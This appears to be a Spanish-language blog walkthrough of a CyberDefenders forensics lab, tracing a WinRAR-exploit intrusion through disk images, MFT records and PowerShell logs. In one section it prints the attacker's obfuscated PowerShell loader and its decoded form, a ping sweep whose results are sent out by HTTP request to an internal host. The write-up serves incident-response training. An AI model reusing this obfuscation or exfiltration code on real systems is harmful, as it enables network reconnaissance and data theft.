---
layout: single
title: Cyberdefender - SpottedInTheWild 
excerpt: Una vulnerabilidad en el software WinRar ha dado lugar a comportamiento de red sospechoso dentro de la organización, nuestro trabajo como miembro del equipo de respuesta a incidentes es determinar qué y cómo fue que pasó.
date: 2025-5-9
classes: wide
categories:
   - cyberdefenders
   - dfir
tags:
   - any.run
   - vhd
---

# **Cyberdefenders - SpottedInTheWild**

Para este laboratorio se nos da una imágen de disco virtual `.vhd`, que podemos facilemnte montar en linux.

Primero averiguamos las particiones
```bash 
┌──(kali㉿kali)-[~/blue-labs/spotted-cyber/temp_extract_dir]
└─$ virt-filesystems -a c125-SpottedInTheWild.vhd --long --parts            
Name       Type       MBR  Size        Parent
/dev/sda1  partition  07   2696053248  /dev/sda
```

Y ya podemos montar con: 
```bash 
┌──(kali㉿kali)-[/mnt]
└─$ sudo guestmount -a c125-SpottedInTheWild.vhd -m /dev/sda1 --ro /mnt/spotted
```

Aquí me di cuenta que se trata de una imagen windows. 
Ya que un .vhd (Virtual Hard Disk) es un archivo que simula un disco duro físico. Fue desarrollado por Microsoft para usarse con máquinas virtuales (como en Hyper-V o Virtual PC), pero también es compatible con muchas otras herramientas de análisis forense y virtualización (como VirtualBox, QEMU, etc.).

Así que podemos montar esto también en Windows, una vez descomprimimos el .zip lo que hacemos es abrir el administrador de díscos: 

- `Win + R` y escribimos: 
```bash 
diskmgmt.msc
```
- Una vez dentro damos click en `Acción > Exponer VHD`, navegamos hasta nuestro .vhd y se monta auntomaticamente. Con esto ya podemos ver todos los ficheros.

Con esto ya podemos continuar con las preguntas: 

---
<h2 style="color: #0d6efd;">1. En su investigación sobre la brecha del FinTrust Bank, encontró una aplicación que era el punto de entrada del ataque. ¿Qué aplicación se utilizó para descargar el archivo malicioso? </h2>

Para esto lo primero que revisé fue las aplicaciones de los usuarios, el que nos interesa es el administrador, así que navegué a la siguiente ruta: 

```bash
C/Users/Administrator/AppData/Roaming/
```

Aquí vemos la aplicación de telegram, así que lo primero que pensamos es esta es la aplicación, no es la primera vez que escuchamos cosas malas de telegram. 

---
<h2 style="color: #0d6efd;">2. Averiguar cuándo comenzó el ataque es fundamental. Cuál es la fecha UTC en la que se descargó por primera vez el archivo sospechoso?</h2>

Para resolver esto lo primero en lo que pensé fue en la `$MFT` y en `$UsnJournal($J)`. Ya sabemos que la intrusión empezó con telegram, así que podemos buscar ficheros que tengan como `Paret Path` a telgram.
 primero parsee el `$J` con la herramienta `MFTECmd.exe`, pero no encontré nada aqui, depués parseé el `$MFT` con el siguiente comando: 
```bash
PS C:\Users\Usuario\Downloads\MFTECmd> .\MFTECmd.exe -f "E:\C\`$MFT" --csv "C:\Ruta\Salida" --csvf mft.csv
```

Abrimos el CSV con `TimeLine Explorer`, aplicamos un filtro en el Parent Path con la palabra `Telegram`. 
Vemos varios ficheros, lo que hizo que determinara cual fue el fichero malicioso fue el campo `Zone ID Contents`. Tenemos un fichero `ZoneId = 3` que significa que su origen es de internet: 

| ZoneId | Zona                     |
| ------ | ------------------------ |
| 0      | Mi equipo                |
| 1      | Zona local intranet      |
| 2      | Zona sitios de confianza |
| 3      | Zona Internet            |
| 4      | Zona sitios restringidos |

Pero hay que recordar que todos los ficheros descargados de telegram como videos, fotos, pdf's tendrán este ZoneID, así que en un entorno más grande puede ser dificil determinar esto unicamente por este campo. 

---
<h2 style="color: #0d6efd;">3. Saber qué vulnerabilidad fue explotada es clave para mejorar la seguridad. Cuál es el identificador CVE de la vulnerabilidad utilizada en este ataque?</h2>

Para esto busqué en internet por el nombre del fichero malicioso, me encotré con el [siguiente análisis](https://any.run/report/d1a55bb98b750ce9b9d9610a857ddc408331b6ae6834c1cbccca4fd1c50c4fb8/fe007c98-c464-48dd-9c6b-867983eee22d)de `ANY.run` donde mencionan el CVE. 

---
<h2 style="color: #0d6efd;">4. Al examinar el archivo descargado, se ha dado cuenta de que hay un archivo con una extensión extraña que indica que podría ser malicioso. ¿Cuál es el nombre de este archivo?</h2>

Esto lo pude ver fácilemte con el siguiente comando en la terminal de linux: 

```bash
┌──(root㉿kali)-[/mnt/…/Users/Administrator/Downloads/Telegram Desktop]
└─# 7z l SANS\ SEC401.rar

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 29729 bytes (30 KiB)

Listing archive: SANS SEC401.rar

--
Path = SANS SEC401.rar
Type = zip
Physical Size = 29729

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-02-03 09:11:32 D....            0            0  SANS SEC401.pdf
2024-02-03 09:11:32 .....        34434        27276  SANS SEC401.pdf
2024-02-03 09:11:32 .....        10724         2063  SANS SEC401.pdf /SANS SEC401.pdf .cmd
------------------- ----- ------------ ------------  ------------------------
```

Hay un fichero con una extensión extraña, `.cmd` `.pdf`, ¿tal vez alguna técnica de evasión?
---
<h2 style="color: #0d6efd;">5. Descubrir los métodos de entrega de la carga útil ayuda a comprender los vectores de ataque utilizados. Cuál es la URL utilizada por el atacante para descargar la segunda fase del malware?</h2>

Esto también podemos encontrarlo si nos detenemos a leer el reporte de `ANY.run`: 

![](../assets/images/cyber-spotted/imagen2.png)

---
<h2 style="color: #0d6efd;">6. Para comprender mejor cómo los atacantes cubren sus huellas, identifique el script que utilizaron para manipular los registros de eventos. ¿Cuál es el nombre del script? </h2>

Para esto pensé que tal vez podría encontrarlo en el anterior reporte de ANY.run, intente ver si había algún eventID por el cual buscar pero no parecía haber algo interesante. 

Pero depués GPT mencionó el $MFT, rapidamente fui a buscar ficheros con extensión `.ps1`, solo había que correlacionarlos con el timestamp que ya habiamos dado anteiormente, podemos ver 3, el nombre es más que obvio. 

![](../assets/images/cyber-spotted/imagen3.png)

---
<h2 style="color: #0d6efd;">7. Saber cuándo se produjeron las acciones no autorizadas ayuda a comprender el ataque. Cuál es la fecha UTC en la que se ejecutó el script que manipuló los registros de eventos?</h2>

Para esto primero busqué en la $MFT, luego en el $UsnJrnl, y el en prefetch pero no encontré nada. 
Finalmente fui a la ruta `/mnt/spotted/C/Windows/System32/winevt/logs`, ahí vi un .evtx relacionado con powershell, asi que lo primero que pensé fue en `chainsaw`y `jq`:

```txt
┌──(root㉿kali)-[/mnt/…/Windows/System32/winevt/logs]
└─# /opt/chainsaw/target/release/chainsaw dump Windows\ PowerShell.evtx --jsonl > /home/kali/blue-labs/spotted-cyber/powershell.jsonl
```

Podemos contar los EventID: 
```bash
┌──(root㉿kali)-[/home/kali/blue-labs/spotted-cyber]
└─# cat powershell.jsonl| jq '.Event | .System.EventID' | sort | uniq -c
      4 400
      2 403
     24 600
```

En el canal clásico **Windows PowerShell** (no el “Operational”), estos **Event ID** tienen el siguiente significado:

* **400 – “Engine state is changed from None to Available”**
  Marca el **inicio** de una actividad de PowerShell (local o remota). El campo **HostName** te dirá si fue una sesión de consola (“ConsoleHost”) o remota (“ServerRemoteHost”).

* **403 – “Engine state is changed from Available to Stopped”**
  Indica el **fin** de esa misma actividad de PowerShell. Permite saber cuánto duró la sesión o comando.

* **600 – “A Provider is Started”**
  Señala que un **PowerShell Provider** (por ejemplo, el de registro, el de WSMan, etc.) se ha iniciando dentro de esa sesión o comando.

**Flujo típico** en un solo comando o pipeline:

1. Evento **400** al arrancar el motor.
2. Uno o varios **600** conforme PowerShell carga proveedores que necesita.
3. Evento **403** al detener el motor al terminar.

Así que lo primero que hacemos es revisar el primer registro:

```bash
┌──(root㉿kali)-[/home/kali/blue-labs/spotted-cyber]
└─# jq -c '.Event' powershell.jsonl | head -n 1 | jq
{
  "System": {
    "Provider_attributes": {
      "Name": "PowerShell"
    },
    "EventID_attributes": {
      "Qualifiers": 0
    },
    "EventID": 403,
    "Level": 4,
    "Task": 4,
    "Keywords": "0x80000000000000",
    "TimeCreated_attributes": {
      "SystemTime": "2024-02-03T07:38:01.124150Z"
    },
    "EventRecordID": 56,
    "Channel": "Windows PowerShell",
    "Computer": "DESKTOP-2R3AR22",
    "Security": null
  },
  "EventData": {
    "Data": [
      "Stopped",
      "Available",
      "\tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.17763.1\r\n\tHostId=71f90463-6c3b-4051-91a0-90ced9c1e0d7\r\n\tHostApplication=powershell -NOP -EP Bypass C:\\Windows\\Temp\\Eventlogs.ps1\r\n\tEngineVersion=5.1.17763.1\r\n\tRunspaceId=6e0eac6c-8cae-4ab5-abb1-3ccb8b938fca\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="
    ],
    "Binary": null
  }
}
```

Se ejecuta el `Eventlogs.ps1`, el timestamp de este log es el que buscamos. 

---
<h2 style="color: #0d6efd;">8. Necesitamos identificar si el atacante mantuvo acceso a la máquina. Cuál es el comando utilizado por el atacante para la persistencia? </h2>

Esto podemos verlo descargando el fichero malicioso en un entorno controlado y subiendolo a ANY.run 

![](../assets/images/cyber-spotted/imagen4.png)

---
<h2 style="color: #0d6efd;">9. Para entender la estrategia de exfiltración de datos del atacante, necesitamos localizar dónde almacenó los datos recopilados. Cuál es la ruta completa del archivo que almacena los datos recopilados por una de las herramientas del atacante para preparar la exfiltración de datos?</h2>

Esto podemos hacerlo analizando la siguiente ruta: 
```bash 
C/Windows/Temp
```

Que podemos obtener del análisis del MFT. 

Aquí solo podemos encontrar el fichero `run.ps1`, aplicando un string: 

```bash 
┌──(root㉿kali)-[/mnt/spotted/C/Windows/Temp]
└─# strings run.ps1
$best64code = "K0AVFdEIk9Ga0VWTtAiIyFmdk8CMwADO6UjLx4CO2EjLykTMv8iOwRHdoJCIpJXVtACdzVWdxVmUiV2VtU2avZnbJpQDpkSZslmR0VHc0V3bkgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFKn5WayR3U0YTZzFmQvRlO60FdyVmdu92Qu0WZ0NXeTtFI9AichZHJK0gIlxWaGRXdwRXdvRCIvRHIkVmdhNHIzRHb1NXZyBibhN2UiACdz9GStUGdpJ3VK0gCN0nCN0HIgACIK0QZslmR0VHc0V3bkACa0FGUlxWaG1CIk5WZwBXQtASZslmRtQXdPBCfgIiLl5WasZmZvBycpBCUJRnblJnc1NGJgQ3cvhkIgACIgACIgAiCNIiLl5WasZmZvBycpBCUJRnblJnc1NGJgQ3cvhkIgQ3cvhULlRXaydFIgACIgACIgoQD7BSZzxWZg0HIgACIK0QZslmR0VHc0V3bkACa0FGUlxWaG1CIk5WZwBXQtASZslmRtQXdPBCfgIiLl5Was52bgMXagAVS05WZyJXdjRCI0N3bIJCIgACIgACIgoQDi4SZulGbu9GIzlGIQlEduVmcyV3YkACdz9GSiACdz9GStUGdpJ3VgACIgACIgAiCNsHIpwGb15GJgUmbtACdsV3clJHJoAiZpBCIgAiCNoQDlVnbpRnbvNUesRnblxWaTBibvlGdjFkcvJncF1CIxACduV3bD1CIQlEduVmcyV3YkASZtFmTyVGd1BXbvNULg42bpR3Yl5mbvNUL0NXZUBSPgQHb1NXZyRCIgACIK0gI05WZyJXdjRSKpEDIrASKn4yJoY2T4VGZulEdzFGTuAVS0JXY0NHJgwCMocmbpJHdzJWdT5CUJRnchR3ckgCJiASPgAVS05WZyJXdjRCIgACIK0wegkyKrQnblJnc1NGJgsDZuVGJgUGbtACduVmcyV3YkAyO0JXY0NHJg0DI05WZyJXdjRCKgI3bmpQDK0QXzsVKoMXZ0lnQzNXZyRGZBRXZH5SKQlEZuVGJoU2cyFGU6oTXzNXZyRGZBBVSuQXZO5SblR3c5N1Wg0DIk5WZkoQDdNzWpgyclRXeCN3clJHZkFEdldkLpAVS0JXY0NHJoU2cyFGU6oTXzNXZyRGZBBVSuQXZO5SblR3c5N1Wg0DI0JXY0NHJK0gCNICd4RnL2UzM0wkQcBXblRFXsF2YvxEXhRXYEBHcBxVZslmZvJHUyV2cVpjduVGJiASPgUGbpZEd1BHd19GJK0gI5kjLx4CO2EjLykTMiASPgAVSk5WZkoQDiEjLx4CO2EjLykTMiASPgAVS0JXY0NHJ" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LOAdCode = [System.TexT.EncOdING]::uTF8.gETStrING([SYSTeM.COnvErT]::FROmBAse64strIng("$baSE64")) ;
$PWN = "INv"+"oKE"+"-EX"+"pre"+"ssi"+"oN" ; new-alIAS -naME pWn -vALue $Pwn -foRcE ; pwN $LOAdCODe ;
```

Parece que es un string al revés(Reverse($base64)), así que desencodeamos. 

```bash 
┌──(root㉿kali)-[/mnt/spotted/C/Windows/Temp]
└─# echo "<SNIP>" | rev | base64 -d   

$startIP = "192.168.1.1"
$endIP = "192.168.1.99"
$outputFile = "$env:UserProfile\AppData\Local\Temp\BL4356.txt"

$start = [System.Net.IPAddress]::Parse($startIP).GetAddressBytes()[3]
$end = [System.Net.IPAddress]::Parse($endIP).GetAddressBytes()[3]

for ($current = $start; $current -le $end; $current++) {
    $currentIP = "$($startIP.Substring(0, $startIP.LastIndexOf('.') + 1))$current"
    $result = Test-Connection -ComputerName $currentIP -Count 1 -ErrorAction SilentlyContinue

    if ($result -ne $null) {
        Write-Host "Host $currentIP is online."
        "Host $currentIP is online." | Out-File -Append -FilePath $outputFile
    } else {
        Write-Host "Host $currentIP is offline."
        "Host $currentIP is offline." | Out-File -Append -FilePath $outputFile
    }
}

Write-Host "Scan results saved to $outputFile"
$var = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($outputFile))
Invoke-WebRequest -Uri "http://192.168.1.5:8000/$var" -Method GET
``` 

1. **Define un rango de IPs**:

   ```powershell
   $startIP = "192.168.1.1"
   $endIP = "192.168.1.99"
   ```

   Esto indica que el script escaneará desde la `192.168.1.1` hasta la `192.168.1.99`.

2. **Realiza un barrido de red (ping sweep)**:
   Utiliza `Test-Connection` (similar a `ping`) para verificar qué hosts están activos.

3. **Guarda resultados en un archivo temporal**:
   El archivo `BL4356.txt` en la carpeta `%USERPROFILE%\AppData\Local\Temp` contiene qué hosts están online/offline.

4. **Exfiltra los resultados**:
   Codifica el archivo en Base64:

   ```powershell
   [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($outputFile))
   ```

   Luego realiza una **petición GET a `http://192.168.1.5:8000/$var`**, donde `$var` es la cadena codificada.

---
Otras herramientas interesantes para este análisis: 

[CMD watcher](https://www.kahusecurity.com/tools.html)
[watcher](https://github.com/radovskyb/watcher/tree/master)
[ArsenalImageMounter](https://arsenalrecon.com/products/arsenal-image-mounter)

